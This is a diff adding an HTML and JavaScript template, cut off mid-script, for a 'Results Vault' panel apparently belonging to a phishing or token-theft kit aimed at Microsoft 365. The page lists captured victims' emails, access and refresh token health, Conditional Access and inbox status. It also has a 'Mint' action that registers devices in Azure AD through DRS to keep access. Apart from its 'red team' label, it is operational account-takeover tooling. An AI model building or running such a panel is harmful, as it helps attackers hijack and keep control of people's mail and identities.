@@ -1,0 +1,2365 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Results Vault — Red Team Console</title>
+<meta name="description" content="Captured sessions, token health, and per-target export">
+<style>
+    /* ============================================================
+       RESET
+       ============================================================ */
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    /* ============================================================
+       TOKENS — sharp, flat, mono-data aesthetic
+       ============================================================ */
+    :root {
+        --bg:           #080b12;
+        --bg-panel:     #0d121c;
+        --bg-elev:      #111826;
+        --bg-input:     #0a0f18;
+        --line:         #1e2736;
+        --line-strong:  #2a3a55;
+        --text:         #dfe6f2;
+        --text-dim:     #7d8ba3;
+        --text-faint:   #4f5c73;
+        --accent:       #e03a4a;
+        --accent-dim:   #7a1f2a;
+        --success:      #2ed573;
+        --warning:      #ffa502;
+        --danger:       #ff4757;
+
+        --font-sans: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
+        --font-mono: 'SF Mono', 'JetBrains Mono', 'Fira Code', ui-monospace, monospace;
+
+        --gap: 12px;
+        --topbar-h: 56px;
+    }
+
+    html, body { height: 100%; }
+
+    body {
+        font-family: var(--font-sans);
+        font-size: 13px;
+        line-height: 1.5;
+        color: var(--text);
+        background: var(--bg);
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+        display: flex;
+        flex-direction: column;
+        min-height: 100vh;
+        font-feature-settings: "tnum" 1;
+        background-image:
+            linear-gradient(rgba(30, 39, 54, 0.35) 1px, transparent 1px),
+            linear-gradient(90deg, rgba(30, 39, 54, 0.35) 1px, transparent 1px);
+        background-size: 48px 48px;
+        background-position: -1px -1px;
+    }
+
+    ::selection { background: rgba(224, 58, 74, 0.35); color: var(--text); }
+
+    ::-webkit-scrollbar { width: 8px; height: 8px; }
+    ::-webkit-scrollbar-track { background: var(--bg); }
+    ::-webkit-scrollbar-thumb { background: var(--line-strong); }
+    ::-webkit-scrollbar-thumb:hover { background: var(--accent-dim); }
+
+    /* ============================================================
+       TOPBAR
+       ============================================================ */
+    .topbar {
+        display: flex;
+        align-items: stretch;
+        justify-content: space-between;
+        gap: var(--gap);
+        flex-wrap: wrap;
+        border: 1px solid var(--line);
+        background: var(--bg-panel);
+        margin: 16px auto 0;
+        max-width: 1440px;
+        width: calc(100% - 32px);
+        position: sticky;
+        top: 16px;
+        z-index: 50;
+    }
+
+    .brand {
+        display: flex;
+        align-items: center;
+        gap: 14px;
+        padding: 14px 18px;
+        border-right: 1px solid var(--line);
+        flex: 1 1 auto;
+        min-width: 260px;
+    }
+
+    .brand-mark {
+        width: 38px;
+        height: 38px;
+        background: var(--accent);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        flex-shrink: 0;
+        overflow: hidden;
+    }
+    .brand-mark img { width: 100%; height: 100%; object-fit: cover; display: block; }
+
+    .brand-text { display: flex; flex-direction: column; line-height: 1.15; min-width: 0; }
+    .brand-text .name {
+        font-size: 15px;
+        font-weight: 700;
+        letter-spacing: 0.06em;
+        text-transform: uppercase;
+        color: var(--text);
+    }
+    .brand-text .sub {
+        font-size: 10.5px;
+        color: var(--text-faint);
+        letter-spacing: 0.08em;
+        text-transform: uppercase;
+        font-family: var(--font-mono);
+        margin-top: 2px;
+    }
+
+    .topbar-actions {
+        display: flex;
+        align-items: stretch;
+        flex-wrap: wrap;
+    }
+
+    .topbar-actions .btn {
+        border: none;
+        border-left: 1px solid var(--line);
+        background: transparent;
+        height: auto;
+        min-height: 100%;
+        padding: 0 18px;
+        font-size: 11px;
+        letter-spacing: 0.08em;
+        text-transform: uppercase;
+        color: var(--text-dim);
+        font-weight: 600;
+        font-family: var(--font-mono);
+        border-radius: 0;
+        cursor: pointer;
+        text-decoration: none;
+        display: inline-flex;
+        align-items: center;
+        gap: 8px;
+        transition: background 0.12s, color 0.12s;
+    }
+    .topbar-actions .btn:hover { background: var(--bg-elev); color: var(--text); border-color: var(--line); }
+    .topbar-actions .btn.is-primary { color: var(--accent); }
+    .topbar-actions .btn.is-primary:hover { background: var(--accent); color: #fff; }
+
+    /* ============================================================
+       LAYOUT
+       ============================================================ */
+    .shell {
+        max-width: 1440px;
+        width: 100%;
+        margin: 0 auto;
+        padding: 16px;
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        gap: var(--gap);
+    }
+
+    /* ============================================================
+       METRIC STRIP
+       ============================================================ */
+    .metric-strip {
+        display: grid;
+        grid-template-columns: repeat(4, 1fr);
+        border: 1px solid var(--line);
+        background: var(--bg-panel);
+    }
+
+    .metric {
+        padding: 14px 18px;
+        border-right: 1px solid var(--line);
+        display: flex;
+        flex-direction: column;
+        gap: 4px;
+        min-width: 0;
+    }
+    .metric:last-child { border-right: none; }
+
+    .metric-label {
+        font-size: 10px;
+        font-family: var(--font-mono);
+        letter-spacing: 0.12em;
+        text-transform: uppercase;
+        color: var(--text-faint);
+        font-weight: 600;
+    }
+    .metric-value {
+        font-size: 22px;
+        font-weight: 700;
+        color: var(--text);
+        font-variant-numeric: tabular-nums;
+        letter-spacing: -0.02em;
+        line-height: 1.1;
+        font-family: var(--font-mono);
+    }
+    .metric-value.is-accent { color: var(--accent); }
+    .metric-value.is-success { color: var(--success); }
+    .metric-value.is-warning { color: var(--warning); }
+    .metric-value.is-danger { color: var(--danger); }
+    .metric-sub {
+        font-size: 10px;
+        color: var(--text-faint);
+        font-family: var(--font-mono);
+        letter-spacing: 0.04em;
+    }
+
+    /* ============================================================
+       PANEL
+       ============================================================ */
+    .panel {
+        border: 1px solid var(--line);
+        background: var(--bg-panel);
+        display: flex;
+        flex-direction: column;
+    }
+
+    .panel-head {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: 12px;
+        padding: 0 16px;
+        height: 42px;
+        border-bottom: 1px solid var(--line);
+        background: var(--bg-elev);
+        flex-wrap: wrap;
+    }
+
+    .panel-title {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        font-size: 11px;
+        font-weight: 700;
+        letter-spacing: 0.14em;
+        text-transform: uppercase;
+        color: var(--text);
+        font-family: var(--font-mono);
+    }
+    .panel-title::before {
+        content: '';
+        width: 3px;
+        height: 14px;
+        background: var(--accent);
+        display: inline-block;
+    }
+
+    .panel-tools {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        flex-wrap: wrap;
+    }
+
+    .panel-body { padding: 0; }
+
+    /* ============================================================
+       STATUS STRIP
+       ============================================================ */
+    .status-strip {
+        display: none;
+        align-items: center;
+        gap: 8px;
+        padding: 10px 14px;
+        background: var(--bg-panel);
+        border: 1px solid var(--line);
+        border-left: 3px solid var(--accent);
+        font-size: 12px;
+        color: var(--text-dim);
+        font-family: var(--font-mono);
+        letter-spacing: 0.02em;
+    }
+    .status-strip.visible { display: flex; }
+    .status-strip.success { border-left-color: var(--success); color: var(--success); }
+    .status-strip.error   { border-left-color: var(--danger);  color: var(--danger); }
+    .status-strip.warning { border-left-color: var(--warning); color: var(--warning); }
+
+    /* ============================================================
+       BUTTONS
+       ============================================================ */
+    .btn {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        gap: 6px;
+        height: 28px;
+        padding: 0 12px;
+        border: 1px solid var(--line-strong);
+        background: transparent;
+        color: var(--text-dim);
+        font-size: 10.5px;
+        font-weight: 600;
+        font-family: var(--font-mono);
+        letter-spacing: 0.08em;
+        text-transform: uppercase;
+        cursor: pointer;
+        text-decoration: none;
+        transition: background 0.12s, color 0.12s, border-color 0.12s;
+        border-radius: 0;
+        white-space: nowrap;
+    }
+    .btn:hover:not(:disabled) {
+        background: var(--bg-elev);
+        color: var(--text);
+        border-color: var(--accent-dim);
+    }
+    .btn:focus-visible { outline: 1px solid var(--accent); outline-offset: 1px; }
+    .btn:disabled { opacity: 0.4; cursor: not-allowed; }
+
+    .btn-primary {
+        background: var(--accent);
+        border-color: var(--accent);
+        color: #fff;
+    }
+    .btn-primary:hover:not(:disabled) { background: #c92d3c; border-color: #c92d3c; }
+
+    .btn-danger { color: var(--danger); border-color: var(--line); }
+    .btn-danger:hover:not(:disabled) {
+        background: rgba(255, 71, 87, 0.06);
+        border-color: var(--danger);
+        color: var(--danger);
+    }
+
+    .btn-ghost { border-color: transparent; }
+    .btn-ghost:hover:not(:disabled) { border-color: var(--line-strong); }
+
+    .btn-xs {
+        height: 22px;
+        padding: 0 8px;
+        font-size: 10px;
+    }
+
+    /* ============================================================
+       FILTERS
+       ============================================================ */
+    .filters {
+        display: grid;
+        grid-template-columns: minmax(220px, 2fr) minmax(130px, 1fr) minmax(150px, 1fr) minmax(150px, 1fr) auto;
+        gap: var(--gap);
+        align-items: center;
+        padding: 14px 16px;
+        border-bottom: 1px solid var(--line);
+    }
+
+    @media (max-width: 900px) {
+        .filters { grid-template-columns: 1fr 1fr; }
+        .filters .f-search { grid-column: 1 / -1; }
+    }
+    @media (max-width: 540px) {
+        .filters { grid-template-columns: 1fr; }
+    }
+
+    .field {
+        display: flex;
+        align-items: center;
+        height: 32px;
+        padding: 0 10px;
+        background: var(--bg-input);
+        border: 1px solid var(--line);
+        border-radius: 0;
+        transition: border-color 0.12s;
+    }
+    .field:focus-within { border-color: var(--accent-dim); }
+
+    .field input,
+    .field select {
+        width: 100%;
+        height: 100%;
+        background: transparent;
+        border: none;
+        outline: none;
+        color: var(--text);
+        font-family: var(--font-mono);
+        font-size: 11.5px;
+        letter-spacing: 0.02em;
+    }
+    .field input::placeholder { color: var(--text-faint); }
+
+    .field select {
+        cursor: pointer;
+        appearance: none;
+        -webkit-appearance: none;
+        padding-right: 18px;
+        background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='10' height='6' viewBox='0 0 10 6'><path fill='%234f5c73' d='M0 0l5 6 5-6z'/></svg>");
+        background-repeat: no-repeat;
+        background-position: right 2px center;
+    }
+    .field select option { background: var(--bg-panel); color: var(--text); }
+
+    .field.f-search.is-busy {
+        border-color: var(--accent-dim);
+        position: relative;
+    }
+    .field.f-search.is-busy::after {
+        content: '';
+        position: absolute;
+        right: 10px;
+        top: 50%;
+        width: 10px;
+        height: 10px;
+        margin-top: -5px;
+        border: 1.5px solid var(--accent);
+        border-top-color: transparent;
+        border-radius: 50%;
+        animation: spin 0.7s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* ============================================================
+       TABLE
+       ============================================================ */
+    .table-wrap { overflow-x: auto; background: var(--bg-panel); }
+
+    table.vault {
+        width: 100%;
+        border-collapse: collapse;
+        font-size: 12px;
+        min-width: 1080px;
+    }
+
+    table.vault thead th {
+        position: sticky;
+        top: 0;
+        z-index: 1;
+        background: var(--bg-elev);
+        border-bottom: 1px solid var(--line);
+        padding: 10px 14px;
+        font-size: 10px;
+        font-weight: 700;
+        letter-spacing: 0.12em;
+        text-transform: uppercase;
+        color: var(--text-faint);
+        text-align: left;
+        white-space: nowrap;
+        font-family: var(--font-mono);
+    }
+
+    table.vault tbody tr {
+        border-bottom: 1px solid var(--line);
+        transition: background 0.1s;
+    }
+    table.vault tbody tr:last-child { border-bottom: none; }
+    table.vault tbody tr:hover { background: rgba(224, 58, 74, 0.03); }
+
+    table.vault td {
+        padding: 11px 14px;
+        vertical-align: middle;
+        color: var(--text);
+    }
+
+    table.vault td.email {
+        font-family: var(--font-mono);
+        font-size: 11.5px;
+        letter-spacing: 0.01em;
+        word-break: break-all;
+        max-width: 280px;
+        color: var(--text);
+    }
+
+    table.vault td.actions {
+        text-align: right;
+        white-space: nowrap;
+    }
+
+    .row-actions {
+        display: inline-flex;
+        gap: 4px;
+        justify-content: flex-end;
+    }
+
+    .name-cell {
+        display: flex;
+        flex-direction: column;
+        line-height: 1.3;
+        min-width: 0;
+    }
+    .name-primary {
+        font-weight: 500;
+        color: var(--text);
+        white-space: nowrap;
+        overflow: hidden;
+        text-overflow: ellipsis;
+    }
+    .name-secondary {
+        font-size: 10.5px;
+        color: var(--text-faint);
+        white-space: nowrap;
+        overflow: hidden;
+        text-overflow: ellipsis;
+        font-family: var(--font-mono);
+        letter-spacing: 0.02em;
+    }
+
+    .empty-state {
+        padding: 48px 16px;
+        text-align: center;
+        color: var(--text-faint);
+        font-family: var(--font-mono);
+        font-size: 11px;
+        letter-spacing: 0.08em;
+        text-transform: uppercase;
+    }
+
+    /* ============================================================
+       CHIPS
+       ============================================================ */
+    .chip {
+        display: inline-flex;
+        align-items: center;
+        gap: 6px;
+        height: 22px;
+        padding: 0 8px;
+        font-size: 10px;
+        font-family: var(--font-mono);
+        font-weight: 600;
+        letter-spacing: 0.08em;
+        text-transform: uppercase;
+        border: 1px solid var(--line-strong);
+        color: var(--text-dim);
+        background: transparent;
+        white-space: nowrap;
+        line-height: 1;
+    }
+    .chip::before {
+        content: '';
+        width: 6px;
+        height: 6px;
+        background: currentColor;
+        display: inline-block;
+        flex-shrink: 0;
+    }
+    .chip.is-plain::before { display: none; }
+
+    .chip.ok    { color: var(--success); border-color: rgba(46, 213, 115, 0.35); }
+    .chip.warn  { color: var(--warning); border-color: rgba(255, 165, 2, 0.35); }
+    .chip.err   { color: var(--danger);  border-color: rgba(255, 71, 87, 0.35); }
+    .chip.mute  { color: var(--text-faint); border-color: var(--line); }
+    .chip.info  { color: var(--accent);  border-color: rgba(224, 58, 74, 0.35); }
+    .chip.ca-warn    { color: var(--warning); border-color: rgba(255, 165, 2, 0.5); }
+    .chip.ca-danger  { color: var(--danger);  border-color: rgba(255, 71, 87, 0.5); background: rgba(255, 71, 87, 0.04); }
+
+    /* ============================================================
+       PAGER
+       ============================================================ */
+    .pager {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: 12px;
+        padding: 12px 16px;
+        border-top: 1px solid var(--line);
+        background: var(--bg-elev);
+        font-size: 11px;
+        color: var(--text-faint);
+        font-family: var(--font-mono);
+        letter-spacing: 0.08em;
+        text-transform: uppercase;
+    }
+
+    .pager-actions { display: flex; gap: 4px; }
+
+    /* ============================================================
+       FOOTER
+       ============================================================ */
+    .footer {
+        max-width: 1440px;
+        width: calc(100% - 32px);
+        margin: var(--gap) auto 16px;
+        border: 1px solid var(--line);
+        background: var(--bg-panel);
+        display: flex;
+        align-items: stretch;
+        justify-content: space-between;
+        flex-wrap: wrap;
+        font-family: var(--font-mono);
+        font-size: 10.5px;
+        letter-spacing: 0.08em;
+        text-transform: uppercase;
+        color: var(--text-faint);
+    }
+    .footer > div {
+        padding: 12px 16px;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+    }
+    .footer .divider { color: var(--line-strong); }
+
+    /* ============================================================
+       TOASTS
+       ============================================================ */
+    .toasts {
+        position: fixed;
+        right: 16px;
+        bottom: 16px;
+        display: flex;
+        flex-direction: column;
+        gap: 6px;
+        z-index: 2000;
+        pointer-events: none;
+    }
+    .toast {
+        pointer-events: auto;
+        min-width: 220px;
+        max-width: 360px;
+        padding: 10px 14px;
+        font-size: 11.5px;
+        font-family: var(--font-mono);
+        letter-spacing: 0.02em;
+        color: var(--text);
+        background: var(--bg-panel);
+        border: 1px solid var(--line);
+        border-left: 3px solid var(--accent);
+        box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+        animation: toast-in 140ms ease;
+    }
+    .toast.success { border-left-color: var(--success); color: var(--success); }
+    .toast.error   { border-left-color: var(--danger);  color: var(--danger); }
+    .toast.warning { border-left-color: var(--warning); color: var(--warning); }
+
+    @keyframes toast-in {
+        from { opacity: 0; transform: translateY(4px); }
+        to   { opacity: 1; transform: translateY(0); }
+    }
+
+    /* ============================================================
+       RESPONSIVE
+       ============================================================ */
+    @media (max-width: 900px) {
+        .metric-strip { grid-template-columns: repeat(2, 1fr); }
+        .metric:nth-child(2) { border-right: none; }
+        .metric:nth-child(3),
+        .metric:nth-child(4) { border-top: 1px solid var(--line); }
+        .metric:nth-child(3) { border-right: 1px solid var(--line); }
+        .metric:nth-child(4) { border-right: none; }
+    }
+
+    @media (max-width: 720px) {
+        .topbar,
+        .footer {
+            width: calc(100% - 20px);
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .topbar { flex-direction: column; top: 10px; }
+        .brand { border-right: none; border-bottom: 1px solid var(--line); }
+        .topbar-actions { width: 100%; }
+        .topbar-actions .btn {
+            flex: 1;
+            border-left: none;
+            border-right: 1px solid var(--line);
+            justify-content: center;
+            padding: 12px 8px;
+        }
+        .topbar-actions .btn:last-child { border-right: none; }
+
+        .shell { padding: 10px; gap: 10px; }
+        .metric { padding: 12px 14px; }
+        .metric-value { font-size: 18px; }
+
+        table.vault { min-width: 0; }
+        table.vault thead { display: none; }
+        table.vault,
+        table.vault tbody,
+        table.vault tr,
+        table.vault td {
+            display: block;
+            width: 100%;
+        }
+        table.vault tr {
+            padding: 12px 14px;
+            border-bottom: 1px solid var(--line);
+        }
+        table.vault td {
+            padding: 4px 0;
+            border: none;
+        }
+        table.vault td.email {
+            font-size: 12px;
+            max-width: 100%;
+            margin-bottom: 6px;
+        }
+        table.vault td::before {
+            content: attr(data-label);
+            display: inline-block;
+            min-width: 90px;
+            font-size: 10px;
+            letter-spacing: 0.12em;
+            text-transform: uppercase;
+            color: var(--text-faint);
+            margin-right: 8px;
+            font-family: var(--font-mono);
+            font-weight: 600;
+        }
+        table.vault td.email::before,
+        table.vault td.actions::before { display: none; }
+        table.vault td.actions {
+            text-align: left;
+            margin-top: 10px;
+        }
+        .row-actions { justify-content: flex-start; flex-wrap: wrap; }
+        .pager { flex-direction: column; align-items: stretch; gap: 8px; }
+        .footer { flex-direction: column; }
+        .footer > div { border-bottom: 1px solid var(--line); }
+        .footer > div:last-child { border-bottom: none; }
+    }
+</style>
+</head>
+<body>
+
+<!-- ============================================================
+     TOPBAR
+     ============================================================ -->
+<header class="topbar">
+    <div class="brand">
+        <div class="brand-mark">
+            <img src="{{ url_for('static', filename='logo.png') }}" alt="">
+        </div>
+        <div class="brand-text">
+            <span class="name">Results Vault</span>
+            <span class="sub">Captured sessions · token health · export</span>
+        </div>
+    </div>
+    <nav class="topbar-actions">
+        <a class="btn" href="{{ url_for('change_password') }}">Change password</a>
+        <button class="btn" onclick="triggerImport()">Import</button>
+        <button class="btn" onclick="showDrsReport()">DRS Report</button>
+        <button class="btn is-primary" onclick="loadVault(true)">Refresh</button>
+    </nav>
+</header>
+
+<!-- ============================================================
+     MAIN
+     ============================================================ -->
+<main class="shell">
+    <input type="file" id="vaultImportInput" accept=".json,.jsonl,.txt,application/json" style="display:none" onchange="handleImportFile(event)">
+
+    <div id="statusStrip" class="status-strip"></div>
+
+    <!-- ============================================================
+         METRIC STRIP
+         ============================================================ -->
+    <section class="metric-strip" aria-label="Vault summary">
+        <div class="metric">
+            <span class="metric-label">Captured</span>
+            <span class="metric-value is-accent num" id="mVaultTotal">—</span>
+            <span class="metric-sub" id="mVaultTotalSub">matching current filter</span>
+        </div>
+        <div class="metric">
+            <span class="metric-label">On this page</span>
+            <span class="metric-value num" id="mVaultShown">—</span>
+            <span class="metric-sub" id="mVaultShownSub">rows rendered</span>
+        </div>
+        <div class="metric">
+            <span class="metric-label">Active</span>
+            <span class="metric-value is-success num" id="mVaultActive">—</span>
+            <span class="metric-sub">token valid</span>
+        </div>
+        <div class="metric">
+            <span class="metric-label">Expiring</span>
+            <span class="metric-value is-warning num" id="mVaultExpiring">—</span>
+            <span class="metric-sub">under 1h left</span>
+        </div>
+    </section>
+
+    <!-- ============================================================
+         FILTERS
+         ============================================================ -->
+    <section class="panel">
+        <div class="panel-head">
+            <div class="panel-title">Filters</div>
+            <span id="filterSummary" class="chip mute is-plain">All results</span>
+        </div>
+        <div class="filters">
+            <div class="field f-search" id="vaultSearchField">
+                <input type="text" id="vaultSearch"
+                       placeholder="Search email, name, or title"
+                       autocomplete="off" spellcheck="false">
+            </div>
+            <div class="field">
+                <select id="vaultStatusFilter" onchange="loadVault(true)">
+                    <option value="">All statuses</option>
+                    <option value="active">Active</option>
+                    <option value="dead">Dead / revoked</option>
+                </select>
+            </div>
+            <div class="field">
+                <select id="vaultDrsFilter" onchange="loadVault(true)">
+                    <option value="">DRS: any</option>
+                    <option value="enrolled">DRS: enrolled</option>
+                    <option value="failed">DRS: failed</option>
+                    <option value="never">DRS: never tried</option>
+                </select>
+            </div>
+            <div class="field">
+                <select id="vaultOrder" onchange="loadVault(true)">
+                    <option value="captured_at">Sort: recently captured</option>
+                    <option value="email">Sort: email (A–Z)</option>
+                    <option value="display_name">Sort: name (A–Z)</option>
+                </select>
+            </div>
+            <button class="btn" onclick="loadVault(true)">Apply</button>
+        </div>
+    </section>
+
+    <!-- ============================================================
+         RESULTS TABLE
+         ============================================================ -->
+    <section class="panel">
+        <div class="panel-head">
+            <div class="panel-title">Results</div>
+            <div class="panel-tools">
+                <span id="vaultSummary" class="chip info is-plain">Loading…</span>
+            </div>
+        </div>
+
+        <div class="table-wrap">
+            <table class="vault">
+                <thead>
+                    <tr>
+                        <th style="min-width: 200px;">Email</th>
+                        <th style="min-width: 120px;">Country</th>
+                        <th style="min-width: 120px;">CA</th>
+                        <th style="min-width: 140px;">Name</th>
+                        <th style="min-width: 130px;">Token life</th>
+                        <th style="min-width: 110px;">Status</th>
+                        <th style="min-width: 130px;">DRS</th>
+                        <th style="min-width: 100px;">Inbox</th>
+                        <th style="min-width: 140px;">Captured</th>
+                        <th style="width: 260px; text-align: right;">Actions</th>
+                    </tr>
+                </thead>
+                <tbody id="vaultTableBody">
+                    <tr><td colspan="10" class="empty-state">Loading…</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="pager">
+            <span id="vaultPagination">—</span>
+            <div class="pager-actions">
+                <button class="btn btn-xs" id="vaultPrevBtn" onclick="vaultPage(-1)">Previous</button>
+                <button class="btn btn-xs" id="vaultNextBtn" onclick="vaultPage(1)">Next</button>
+            </div>
+        </div>
+    </section>
+
+</main>
+
+<!-- ============================================================
+     FOOTER
+     ============================================================ -->
+<footer class="footer">
+    <div>
+        <span>Red Team Console</span>
+        <span class="divider">/</span>
+        <span>v3.0</span>
+    </div>
+    <div>
+        <span>Authorized use only</span>
+    </div>
+</footer>
+
+<div id="toastContainer" class="toasts"></div>
+
+<script>
+/* ============================================================
+   UTILITIES
+   ============================================================ */
+function escapeHtml(value) {
+    return String(value ?? '')
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#39;');
+}
+
+function showStatus(message, type = 'info') {
+    const strip = document.getElementById('statusStrip');
+    if (strip) {
+        strip.textContent = message;
+        strip.className = 'status-strip visible ' + type;
+        clearTimeout(showStatus._stripTimer);
+        showStatus._stripTimer = setTimeout(() => {
+            strip.className = 'status-strip';
+        }, 5000);
+    }
+    const container = document.getElementById('toastContainer');
+    if (!container) return;
+    const toast = document.createElement('div');
+    toast.className = `toast ${type}`;
+    toast.textContent = message;
+    container.appendChild(toast);
+    setTimeout(() => { toast.remove(); }, 3600);
+}
+
+function fmtDate(value) {
+    if (!value) return '—';
+    const d = new Date(value);
+    if (Number.isNaN(d.getTime())) return String(value);
+    const y = d.getFullYear();
+    const mo = String(d.getMonth() + 1).padStart(2, '0');
+    const da = String(d.getDate()).padStart(2, '0');
+    const h = String(d.getHours()).padStart(2, '0');
+    const mi = String(d.getMinutes()).padStart(2, '0');
+    return `${y}-${mo}-${da} ${h}:${mi}`;
+}
+
+function formatDuration(totalSeconds) {
+    const s = Math.max(0, Math.floor(totalSeconds));
+    if (s >= 86400) {
+        const d = Math.floor(s / 86400);
+        const h = Math.floor((s % 86400) / 3600);
+        return h ? `${d}d ${h}h` : `${d}d`;
+    }
+    if (s >= 3600) {
+        const h = Math.floor(s / 3600);
+        const m = Math.floor((s % 3600) / 60);
+        return m ? `${h}h ${m}m` : `${h}h`;
+    }
+    if (s >= 60) return `${Math.floor(s / 60)}m`;
+    return `${s}s`;
+}
+
+function fmtInt(n) {
+    const v = Number(n);
+    return Number.isFinite(v) ? v.toLocaleString() : '—';
+}
+
+/* ============================================================
+   SINGLE-FLIGHT GUARD (Mint)
+   ============================================================
+   Tracks email addresses with an in-flight mintCookie call. The
+   button's `disabled` attribute is not reliable across renderTable()
+   DOM replacements — a background auto-refresh during a 20s re-enroll
+   resets the button to enabled (new element, disabled=false default).
+   This set lives at script scope and survives the DOM swap, so a
+   second click short-circuits before firing any network request.
+   Paired with a backend lock in drs_re_enroll so even a race that
+   slips through doesn't register a second device in Azure AD.
+*/
+const _inFlightMint = new Set();
+
+/* ============================================================
+   BADGES
+   ============================================================ */
+function renderTokenLife(row) {
+    if (!row.has_token) {
+        return '<span class="chip mute">no token</span>';
+    }
+
+    const seconds = Number(row.token_seconds_until_expiry);
+    const hasSecs = Number.isFinite(seconds);
+
+    const mgrHealth = String(row.manager_health || '').toLowerCase();
+    const mgrKnown = row.manager_known === true;
+    const mgrAbandoned = row.manager_abandoned === true;
+    const mgrFailures = Number(row.manager_failures || 0);
+    const queued = row.refresh_queued === true;
+
+    if (mgrHealth === 'revoked') {
+        return `<span class="chip err" title="Revoked${row.manager_last_error ? ' — ' + escapeHtml(row.manager_last_error) : ''}">revoked</span>`;
+    }
+    if (mgrHealth === 'dead') {
+        return `<span class="chip err" title="Refresh manager marked this token dead${row.manager_last_error ? ' — ' + escapeHtml(row.manager_last_error) : ''}">dead</span>`;
+    }
+    if (mgrHealth === 'reauth_required') {
+        return '<span class="chip err" title="Requires fresh interactive auth">reauth required</span>';
+    }
+    if (row.manager_in_flight) {
+        return '<span class="chip info" title="Refresh attempt in progress">refreshing…</span>';
+    }
+    if (mgrAbandoned) {
+        return `<span class="chip err" title="Abandoned after ${mgrFailures} consecutive failures">abandoned</span>`;
+    }
+
+    // ── App-side reauth detection ────────────────────────────────
+    // The backend sets manager_reauth_required=true when the last
+    // manager error is AADSTS50078 / 50076 / 50079 / 50158 / 53003,
+    // even if the manager itself reports health='expiring'. Must be
+    // checked before the "expired … queued" fallback below, because
+    // that fallback keys off mgrKnown (not refresh_queued) and would
+    // otherwise show "· queued" for a token that can never refresh.
+    if (row.manager_reauth_required === true) {
+        const why = row.manager_last_error
+            ? ' — ' + escapeHtml(String(row.manager_last_error).slice(0, 120))
+            : '';
+        return `<span class="chip err" title="Blocked on interactive MFA${why}">reauth required</span>`;
+    }
+
+    if (!hasSecs) {
+        return '<span class="chip mute">unknown</span>';
+    }
+
+    if (seconds <= 0 || row.token_expired === true) {
+        const ago = formatDuration(Math.abs(seconds));
+        if (!mgrKnown) {
+            return `<span class="chip warn" title="Not loaded by the refresh manager (no usable refresh token, or manager restarted)">expired ${ago} ago · not queued</span>`;
+        }
+        return `<span class="chip warn" title="Expired; refresh manager will attempt on next cycle">expired ${ago} ago · queued</span>`;
+    }
+
+    const cls = seconds < 3600 ? 'warn' : 'ok';
+    const label = `${formatDuration(seconds)} left`;
+    if (queued) {
+        return `<span class="chip ${cls}" title="Refresh queued">${label} · queued</span>`;
+    }
+    if (mgrFailures > 0) {
+        return `<span class="chip ${cls}" title="${mgrFailures} prior failure(s)${row.manager_last_error ? ': ' + escapeHtml(row.manager_last_error) : ''}">${label} · ${mgrFailures} fail</span>`;
+    }
+    return `<span class="chip ${cls}">${label}</span>`;
+}
+
+function renderStatusBadge(row) {
+    let statusChip;
+    // ── App-side reauth (AADSTS50078 / 50076 / 50079 / 50158 / 53003) ──
+    // The token exists and the refresh token is stored, but the grant
+    // is gated on interactive MFA / CA. Clicking Refresh will keep
+    // failing — only a fresh capture resolves it. This must be checked
+    // before 'recoverable' so the chip doesn't lie with an amber badge.
+    if (row.status_badge === 'reauth_required') {
+        statusChip = '<span class="chip err" title="Refresh token is alive but blocked on interactive MFA or Conditional Access. Clicking Refresh will keep failing — the account needs a fresh capture with sign-in.">reauth</span>';
+    } else if (row.status_badge === 'revoked') {
+        statusChip = '<span class="chip err" title="Refresh manager declared this token revoked (AADSTS50173 or equivalent). The grant is gone; only a fresh capture recovers it.">revoked</span>';
+    } else if (row.status_badge === 'dead') {
+        statusChip = '<span class="chip err" title="Refresh manager declared this token dead or the grant is unrecoverable">dead</span>';
+    } else if (row.status_badge === 'active') {
+        statusChip = '<span class="chip ok" title="Access token valid and refresh token present">active</span>';
+    } else if (row.status_badge === 'recoverable') {
+        statusChip = '<span class="chip warn" title="Access token expired but refresh token present">recoverable</span>';
+    } else if (row.status_badge === 'expired') {
+        statusChip = '<span class="chip err" title="Access token expired and no refresh token">dead</span>';
+    } else {
+        statusChip = '<span class="chip mute" title="No token stored for this capture">no token</span>';
+    }
+
+    const verifiedChip = (row.verified === false)
+        ? ' <span class="chip warn" title="Imported without verification — token was never confirmed live against Microsoft">unverified</span>'
+        : '';
+
+    return `${statusChip}${verifiedChip}`;
+}
+
+/* ---------- DRS state badge ---------- */
+function renderDrsBadge(row) {
+    const state = String(row.drs_state || '').toLowerCase();
+
+    if (!state) {
+        // Backend hasn't been patched yet — fall back to the old flag.
+        if (row.enrolled === true) {
+            return '<span class="chip ok" title="Enrolled (upgrade backend to see timestamp)">enrolled</span>';
+        }
+        return '<span class="chip mute" title="No DRS enrollment on record — click Mint to attempt">unenrolled</span>';
+    }
+
+    if (state === 'enrolled') {
+        const at = row.drs_enrolled_at || '';
+        return `<span class="chip ok" title="Enrolled at ${escapeHtml(at)}">enrolled</span>`;
+    }
+
+    if (state === 'failed') {
+        const kind  = String(row.drs_failure_kind || 'unknown');
+        const hint  = String(row.drs_hint || '');
+        const err   = String(row.drs_enrolled_error || '');
+        const label = {
+            policy:      'policy',
+            device_cap:  'device cap',
+            assignment:  'not assigned',
+            consent:     'consent',
+            app_missing: 'app missing',
+            schema:      'schema',
+            token:       'token',
